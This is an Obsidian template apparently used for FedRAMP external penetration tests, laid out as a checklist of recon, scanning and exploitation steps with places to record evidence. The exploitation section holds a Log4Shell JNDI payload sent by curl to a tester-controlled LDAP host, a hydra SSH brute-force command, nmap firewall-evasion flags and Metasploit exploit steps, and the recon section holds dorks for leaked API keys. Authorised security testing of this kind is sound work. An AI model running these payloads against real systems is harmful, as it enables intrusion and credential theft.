---
engagement: "<%tp.file.folder(true).split('/')[0]%>"
test_type: External
start_date: <%tp.date.now("YYYY-MM-DD")%>
end_date: 
assessor: Kal
status: ğŸ”µ Not Started
completion: 0%
tags: [pentest, fedramp, external, <%tp.date.now("YYYY")%>]
---

# ğŸ›¡ï¸ Phase 1: External Network Penetration Testing
**Target Scope:** <%tp.system.prompt("Target Scope/IP Range")%>
**Date:** <%tp.date.now("YYYY-MM-DD")%>
**Assessor:** Kal

---

## ğŸ› ï¸ Tool Setup Verification
- [ ] Kali VM accessible
- [ ] VPN connected: `ip a | grep tun0`
- [ ] Tools updated: `sudo apt update && sudo apt upgrade -y`
- [ ] Wordlists ready: `/usr/share/seclists`
- [ ] Nmap/Masscan installed

---

## ğŸŸ¦ Section 1: Reconnaissance & Scope Validation
> [!INFO] Focus
> Confirming the boundary, ensuring IP ownership, and finding what was omitted from the SSP.

- [ ] **[PRE-01]: Scope & Boundary Validation** ^pre-01
	- **Status:** ğŸ”µ Not Started | ğŸŸ¡ In Progress | ğŸŸ¢ Complete | ğŸ”´ Blocked
	- **Started:** 
	- **Completed:**
	- **Context:** Verify provided URLs resolve to in-scope IPs. Ensure no CDNs (Cloudflare/Akamai) are tested without authorization.
	- **Command:**
		```bash
		nslookup <URL>
		whois <IP> | grep "OrgName"
		```
	- **Evidence:**
		- **Screenshot:** ![[<%tp.file.folder(true)%>/_Attachments/PRE-01_scope_validation.png]]
		- **Timestamp:** 
		- **Output:**
		```text
		[paste command output here]
		```
		- **Notes:**

- [ ] **[REC-01]: DNS & Subdomain Enumeration** ^rec-01
	- **Status:** ğŸ”µ Not Started | ğŸŸ¡ In Progress | ğŸŸ¢ Complete | ğŸ”´ Blocked
	- **Started:** 
	- **Completed:**
	- **Context:** Identify "shadow IT" or forgotten dev environments.
	- **Command:**
		```bash
		amass enum -active -d <DOMAIN> -o amass_results.txt
		subfinder -d <DOMAIN> -o subfinder_results.txt
		```
	- **Evidence:**
		- **Screenshot:** ![[<%tp.file.folder(true)%>/_Attachments/REC-01_subdomain_enum.png]]
		- **Output File:** [[<%tp.file.folder(true)%>/_Attachments/amass_results.txt]]
		- **Timestamp:** 
		- **Output:**
		```text
		[paste discovered subdomains here]
		```
		- **Notes:**

- [ ] **[REC-02]: Advanced OSINT & Dorks** ^rec-02
	- **Status:** ğŸ”µ Not Started | ğŸŸ¡ In Progress | ğŸŸ¢ Complete | ğŸ”´ Blocked
	- **Started:** 
	- **Completed:**
	- **Context:** Find leaked configs, keys, or tech stack details.
	- **Google Dorks:**
		* `site:github.com "<DOMAIN>" "API_KEY"`
		* `site:pastebin.com "<DOMAIN>"`
		* `site:<DOMAIN> ext:xml | ext:conf | ext:cnf | ext:rdp`
	- **Evidence:**
		- **Screenshot:** ![[<%tp.file.folder(true)%>/_Attachments/REC-02_osint_findings.png]]
		- **Timestamp:** 
		- **Findings:**
		```text
		[paste findings or "No Findings"]
		```
		- **Notes:**

---

## ğŸŸ§ Section 2: Scanning & Enumeration
> [!WARNING] Focus
> Identification of services and automated vulnerability discovery (NIST RA-5).

- [ ] **[VUL-01]: Discovery (Port Scan + Service ID)** ^vul-01
	- **Status:** ğŸ”µ Not Started | ğŸŸ¡ In Progress | ğŸŸ¢ Complete | ğŸ”´ Blocked
	- **Started:** 
	- **Completed:**
	- **Context:** Map all listening ports.
	- **Small Scope Command:**
		```bash
		nmap -p- -sV -sC -Pn -T4 -oA external_full_tcp <TARGET_IP>
		```
	- **Large Scope Strategy:**
		```bash
		# 1. Fast discovery
		masscan -p1-65535 <IP_RANGE> --rate=1000 -oG masscan.txt
		# 2. Parse to targets
		grep "open" masscan.txt | awk '{print $2":"$4}' | sed 's/\/open//' > targets.txt
		# 3. Detailed scan
		nmap -sV -sC -iL targets.txt -oA external_targeted
		```
	- **Evidence:**
		- **Screenshot:** ![[<%tp.file.folder(true)%>/_Attachments/VUL-01_nmap_scan.png]]
		- **Output File:** [[<%tp.file.folder(true)%>/_Attachments/external_full_tcp.xml]]
		- **Timestamp:** 
		- **Summary Table:**
		
		| IP | Port | Service | Version | Notes |
		|----|------|---------|---------|-------|
		|    |      |         |         |       |
		
		- **Notes:**

- [ ] **[VUL-02]: Unauthenticated Vulnerability Scan (Nessus)** ^vul-02
	- **Status:** ğŸ”µ Not Started | ğŸŸ¡ In Progress | ğŸŸ¢ Complete | ğŸ”´ Blocked
	- **Started:** 
	- **Completed:**
	- **Context:** Automated check for CVEs (Required by FedRAMP for external).
	- **Config:** "Advanced Scan", No Ping, All Ports, Enable Web Plugins.
	- **Evidence:**
		- **Screenshot:** ![[<%tp.file.folder(true)%>/_Attachments/VUL-02_nessus_dashboard.png]]
		- **Report:** [[<%tp.file.folder(true)%>/_Attachments/Nessus_Report.html]]
		- **Timestamp:** 
		- **Critical/High Findings:**
		```text
		[list critical and high findings]
		```
		- **Related Findings:** [[Finding_]]
		- **Notes:**

- [ ] **[VUL-03]: SSL/TLS Hygiene (SC-8)** ^vul-03
	- **Status:** ğŸ”µ Not Started | ğŸŸ¡ In Progress | ğŸŸ¢ Complete | ğŸ”´ Blocked
	- **Started:** 
	- **Completed:**
	- **Context:** Verify FIPS compliance (TLS 1.2+, No Weak Ciphers).
	- **Command:**
		```bash
		testssl.sh --fast --severity MEDIUM <URL>
		```
	- **Evidence:**
		- **Screenshot:** ![[<%tp.file.folder(true)%>/_Attachments/VUL-03_testssl_results.png]]
		- **Timestamp:** 
		- **Output:**
		```text
		[paste protocol and cipher list]
		```
		- **Related Findings:** [[Finding_]]
		- **Notes:**

---

## ğŸŸ¥ Section 3: Exploitation & Validation
> [!DANGER] Focus
> Manual verification of Attack Vectors 1 & 2. Validating SC-7 (Boundary Protection).

- [ ] **[EXP-01]: VPN & Remote Access Config** ^exp-01
	- **Status:** ğŸ”µ Not Started | ğŸŸ¡ In Progress | ğŸŸ¢ Complete | ğŸ”´ Blocked
	- **Started:** 
	- **Completed:**
	- **Context:** Check IKE Aggressive mode, Portal CVEs.
	- **Command:**
		```bash
		ike-scan -M -A <VPN_IP>
		nmap --script http-security-headers -p 443 <VPN_URL>
		```
	- **Evidence:**
		- **Screenshot:** ![[<%tp.file.folder(true)%>/_Attachments/EXP-01_vpn_scan.png]]
		- **Timestamp:** 
		- **Output:**
		```text
		[paste IKE scan output or portal screenshot details]
		```
		- **Related Findings:** [[Finding_]]
		- **Notes:**

- [ ] **[EXP-02]: Firewall & Mgmt Interface Exposure (SC-7)** ^exp-02
	- **Status:** ğŸ”µ Not Started | ğŸŸ¡ In Progress | ğŸŸ¢ Complete | ğŸ”´ Blocked
	- **Started:** 
	- **Completed:**
	- **Context:** Mgmt ports (22, 3389, 21) must be blocked or VPN-gated.
	- **Command:**
		```bash
		# Check specific mgmt ports
		nmap -p 22,23,3389,5900,20-21 -Pn <TARGET_IP>
		# Firewall evasion test
		nmap -f -mtu 24 -Pn <TARGET_IP>
		```
	- **Evidence:**
		- **Screenshot:** ![[<%tp.file.folder(true)%>/_Attachments/EXP-02_mgmt_exposure.png]]
		- **Timestamp:** 
		- **Output:**
		```text
		[paste port scan results]
		```
		- **Related Findings:** [[Finding_]]
		- **Notes:**

- [ ] **[EXP-03]: Default Creds & Brute Force (IA-5)** ^exp-03
	- **Status:** ğŸ”µ Not Started | ğŸŸ¡ In Progress | ğŸŸ¢ Complete | ğŸ”´ Blocked
	- **Started:** 
	- **Completed:**
	- **Context:** Test for default creds or weak passwords. **Avoid Lockout.**
	- **Command:**
		```bash
		# Web (Burp Suite Intruder)
		# Target: Login endpoint
		# Attack type: Cluster Bomb
		# Payloads: common usernames + passwords
		
		# SSH/RDP
		hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt <IP> ssh -t 4
		```
	- **Evidence:**
		- **Screenshot:** ![[<%tp.file.folder(true)%>/_Attachments/EXP-03_auth_test.png]]
		- **Timestamp:** 
		- **Output:**
		```text
		[paste results or account lockout message]
		```
		- **Related Findings:** [[Finding_]]
		- **Notes:**

- [ ] **[EXP-04]: Verified Exploitation (CVE Validation)** ^exp-04
	- **Status:** ğŸ”µ Not Started | ğŸŸ¡ In Progress | ğŸŸ¢ Complete | ğŸ”´ Blocked
	- **Started:** 
	- **Completed:**
	- **Context:** Proof of Concept for High/Critical scan findings.
	- **Method:** Metasploit `check` or manual curl.
	- **Command:**
		```bash
		# Example: CVE-2021-44228 (Log4Shell)
		curl -H "User-Agent: ${jndi:ldap://<YOUR_IP>:1389/a}" <TARGET_URL>
		
		# Or Metasploit
		msfconsole
		use exploit/multi/http/<exploit_name>
		set RHOSTS <TARGET_IP>
		check
		```
	- **Evidence:**
		- **Screenshot:** ![[<%tp.file.folder(true)%>/_Attachments/EXP-04_cve_validation.png]]
		- **Timestamp:** 
		- **Output:**
		```text
		[paste POC command and output]
		```
		- **Related Findings:** [[Finding_]]
		- **Notes:**

---

## ğŸ”— Related Sections
- [[TPL_Internal_Pentest|Internal Testing Phase]]
- [[TPL_WebApp_Pentest|Web Application Testing Phase]]

---

## ğŸ“Š Findings Summary

```dataview
TABLE
  finding_id as "ID",
  severity as "Severity",
  status as "Status"
FROM "<%tp.file.folder(true)%>"
WHERE contains(file.name, "Finding")
SORT severity DESC
```

---

## ğŸ“¸ Screenshot Naming Convention
**Format:** `[PHASE]_[SECTION-ID]_[BRIEF-DESC]_[TIMESTAMP]`
**Example:** `EXT_VUL-01_nmap-results_20260112-1430`
